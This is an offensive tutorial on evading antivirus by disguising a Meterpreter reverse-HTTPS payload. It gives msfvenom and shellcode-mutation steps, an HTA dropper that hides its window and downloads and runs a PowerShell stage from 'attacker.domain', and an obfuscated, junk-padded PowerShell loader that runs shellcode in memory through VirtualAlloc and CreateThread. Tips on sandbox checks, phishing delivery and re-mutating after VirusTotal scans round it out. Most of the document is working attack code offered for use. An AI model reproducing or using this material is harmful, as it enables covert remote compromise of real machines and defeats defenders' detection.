
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

													A.V Bypass in 2020: How-to (the easy way that works like a charm)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


												 ###########################################################################################
												 #	Full paper released on 26th June 2020   (thanks to @bluedenkare & @darksh3llRU   											  #
												 #	 						  				    	     																  #
												 #			https://medium.com/@bluedenkare/1-click-meterpreter-exploit-chain-with-beef-and-av-amsi-bypass-96b0eb61f1b6				  #
												 #																												  #
												 #	A copy of the script to automate TTPS descibed is available on GitHub at:												 		  #
												 #																												  #
												 #	darksh3llRU's GitHub: https://github.com/darksh3llRU/tools/master/psh-net_shellcode_fastchange.sh							          #
												 #	kmkz's GitHub: https://github.com/kmkz/Pentesting/AV_Evasion															  #
												 #																												  #
												 #													     															  #
												 ###########################################################################################
												


1 - generate payload using msfvenom + psh-net format:

	msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.13.37 LPORT=443 -f psh-net -o shity_shellcode.ps1


2 - Extract base 64 shellcode content from .ps1 file, store output in a file 


3 - Convert base 64 shellcode in binary format :

	base64 -d base64.txt |xxd -p | tr -d '\n'  >> b64_extract.hex


4 - Customize shellcode using "chiasm-shell" + pwntools Python library (or other tool like Defuse: https://defuse.ca/online-x86-assembler.htm) : 

	Step 1:  Shellcode extraction extract from "b64_extract.hex" file using pwntools:

	*** code
		#! /usr/bin/env python

		from pwn import *

		ShellcodeFile = open("b64_extract.bin","r+") 
		Extracted = ShellcodeFile.readline();

		print(disasm(unhex(Extracted), byte=0, arch='amd64', offset = 0))

		print "[+] Hex value: "+ Extracted
	*** code

		
	Step 2: Customize your shellcode by adding some instructions such as:
		xor rax, rax
		inc ecx
		dec ecx
		inc ecx
		nop (not to many !)
		jump far/relative jump ....

		- Example from 2019:
			 Original: https://pastebin.com/74haMwJX
			 Changed to: https://pastebin.com/rhJiWyDh
			 
		 
	Using chiasm-shell (example):
		python -m chiasm_shell.chiasm_shell
		 
		Assemble:
			asm> setarch x86 64
			Architecture set to x86, mode(s): 64
			asm> xor rax, rax;inc ecx;dec ecx;nop;
			\x48\x31\xc0\xff\xc1\xff\xc9\x90

		Disassemble:
			disasm> \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
			0x1000:	xor	eax, eax
			0x1002:	push	rax
			0x1003:	push	0x68732f2f
			0x1008:	push	0x6e69622f
			0x100d:	mov	ebx, esp
			0x100f:	push	rax
			0x1010:	push	rbx
			0x1011:	mov	ecx, esp
			0x1013:	mov	al, 0xb
			0x1015:	int	0x80


5 - Copy/paste your customize shellcode in a "custom_sc.txt" file 


6 - Convert hexadecimal output to binary format:
	xxd -p -r custom_sc.txt >> custom_sc.bin


7 -  Convert custom shellcode in base 64 :
	cat custom_sc.bin |base64 | tr -d '\n' >> custom_sc_base64.txt


8 - Split base 64 shellcode in several parts and insert it within the "Payload-Final-Stage.ps1" template
	-> important: 
		1 - do not hesitate to add junk code, comment and use basic string obfucation since yes, even in 2020 some AV will catch you on "kernel32.dll" call :/ use : "k"+"er"+"ne"+"l3"+"+"2"+".dl"+"l" instead (no joke: Symantec bypass XD)
		2 - use proxy aware payload delivery + UAgent (to avoid alert on empty/bad UA value) + some sandbox detection (if phishing, ex: https://github.com/kmkz/exploit/blob/master/Full-payload-delivery-chain.ps1) and a landed page checking UA to execute the payload required (ex: https://github.com/kmkz/Sources/blob/master/Browser_FingerPwn.html).

9 - Test in on a VM WITHOUT active AV 1st to validate that shellcode is not broken


10 - When everything is ok, if tested on VirusTotal (score is 0/60), do not forget to perform some changes just after bypass validation (signature will be done very fast after dropping)


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

																		.hta dropper 'First-Stage.hta' that can be used through BeEF (check UA to validate the target first!)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

<script language="VBScript">
  window.moveTo -4000, -4000
  Set ogd = CreateObject("Wscript.Shell")
  Set oxIaTzwl7 = CreateObject("Scripting.FileSystemObject")
  For each path in Split(ogd.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If oxIaTzwl7.FileExists(path + "\..\powershell.exe") Then
      ogd.Run "powershell.exe -nop -exec bypass -c $e=new-object net.webclient;$e.proxy=[Net.WebRequest]::GetSystemWebProxy();$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iEx $e.downloadstring('http://attacker.domain/hta/Payload-Final-Stage.ps1') -UserAgent 'Windows xxx';",0
      Exit For
    End If
  Next
  window.close()
</script>


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

																		PowerShell template example  'Payload-Final-Stage.ps1'

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

############################
#‚JUNKoe‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚-"‚-"‚-"‚-"‚-"‚-"‚-"‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚-'‚-'‚-'‚-'‚-'‚-'

sleep(2)

#‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚"JUNK‚-"‚-'
############################
$fed = 10+1587-4

#Stopwatch should be at 0 elapsed time.
#$stopWatch.Elapsed

#Time span should be set for 1 minute and 30 seconds.
#$timeSpan
#You can compare [TimeSpan] to [TimeSpan]!

#
#This will return true, as the stopwatch elapsed time of 0, is of course less than 1 minute and 30 seconds.
#$stopWatch.Elapsed -le $timeSpan
#And similarly you can check if your stopwatch elapsed time is greater than or equal to the specified time span, in this case it is not.
#$stopWatch.Elapsed -ge $timeSpan

$def = $fed

$xgh = $def

Set-StrictMode -Version 2

$yZEw = @"

	using System;
	using System.Runtime.InteropServices;
	
	namespace e3 {
		public class func {
			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
			
			[DllImport("ke"+"r"+"n"+"el"+"32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			
			[DllImport("k"+"e"+"rnel"+"32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
			[DllImport("kern"+"el32.d"+"ll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
		}
	}
	
	
	
	
	
"@

#Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non risus. Suspendisse lectus tortor, dignissim sit amet, adipiscing nec, ultricies sed, dolor. Cras elementum ultrices diam. Maecenas ligula massa, varius a, semper congue, euismod non, mi. Proin porttitor, orci nec nonummy molestie, enim est eleifend mi, non fermentum diam nisl sit amet erat. Duis semper. Duis arcu massa, scelerisque vitae, consequat in, pretium a, enim. Pellentesque congue. Ut in risus volutpat libero pharetra tempor. Cras vestibulum bibendum augue. Praesent egestas leo in pede. Praesent blandit odio eu enim. Pellentesque sed dui ut augue blandit sodales. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; JUNK nibh. Mauris ac mauris sed pede pellentesque fermentum. Maecenas adipiscing ante non diam sodales hendrerit.

$whb = New-Object Microsoft.CSharp.CSharpCodeProvider
#JUNK convallis sollicitudin purus. Praesent JUNK, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.

$eQ5jS = New-Object System.CodeDom.Compiler.CompilerParameters
#JUNK convallis sollicitudin purus. Praesent JUNK, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.

$x004 = "Syst"+"em.dll"
#JUNK convallis sollicitudin purus. Praesent JUNK, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.

$eQ5jS.ReferencedAssemblies.AddRange(@($x004, [PsObject].Assembly.Location))
#JUNK convallis sollicitudin purus. Praesent JUNK, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.

$eQ5jS.GenerateInMemory = $True
#JUNK convallis sollicitudin purus. Praesent JUNK, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.

$isc = $whb.CompileAssemblyFromSource($eQ5jS, $yZEw)
#Ut velit mauris, egestas sed, gravida nec, ornare ut, mi. Aenean ut orci vel massa suscipit pulvinar. Nulla sollicitudin. Fusce varius, ligula non tempus JUNK, nunc turpis ullamcorper nibh, in tempus sapien eros vitae ligula. Pellentesque rhoncus nunc et augue. Integer id felis. Curabitur aliquet pellentesque diam. Integer quis metus vitae elit lobortis egestas. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Morbi vel erat non mauris convallis vehicula. Nulla et sapien. Integer tortor tellus, JUNK faucibus, convallis id, congue eu, quam. Mauris ullamcorper felis vitae erat. Proin feugiat, augue non elementum posuere, metus purus iaculis lectus, et tristique ligula justo vitae magna.

############################[ SC comes here splitted in as many part as possible ]############################
$s1 = "BASE64_shellcode_string-1"
#JUNK convallis sollicitudin purus. Praesent JUNK, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.

$s2 = "BASE64_shellcode_string-2"
#JUNK convallis sollicitudin purus. Praesent JUNK, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.
sleep(0.2)


$s5 = "BASE64_shellcode_string-4"
#JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi
# iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.
$s3 = "BASE64_shellcode_string-2"
#JUNK convallis sollicitudin purus. Praesent JUNK, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.




$s4 = "BASE64_shellcode_string-3"
#JUNK convallis sollicitudin purus. Praesent JUNK, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.




###################################
$a = "test"
#[Byte[]]$gniS = [System.Convert]::FromBase64String("")

############################[ SC build (concat) ]############################
[Byte[]]$gniS = [System.Convert]::FromBase64String($s1+$s2+$s3+$s4+$s5)

#JUNK convallis sollicitudin purus. 
#Praesent JUNK, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.

$e42 = [e3.func]::VirtualAlloc(0, $gniS.Length + 1, [e3.func+AllocationType]::Reserve -bOr [e3.func+AllocationType]::Commit, [e3.func+MemoryProtection]::ExecuteReadWrite)
#JUNK convallis sollicitudin purus. Praesent JUNK, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.

if ([Bool]!$e42) { $global:result = (2+1); return }
#JUNK convallis sollicitudin purus. Praesent JUNK, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.
[System.Runtime.InteropServices.Marshal]::Copy($gniS, 0, $e42, $gniS.Length)
#JUNK convallis sollicitudin purus. Praesent JUNK, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.

[IntPtr] $xCCf1 = [e3.func]::CreateThread(0,0,$e42,0,0,0)
#JUNK convallis sollicitudin purus. Praesent JUNK, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.

if ([Bool]!$xCCf1) { $global:result = (5+2); return }
#JUNK convallis sollicitudin purus. Praesent JUNK, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.

$hnE = [e3.func]::WaitForSingleObject($xCCf1, [e3.func+Time]::Infinite)
#JUNK convallis sollicitudin purus. Praesent JUNK, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. JUNK euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.
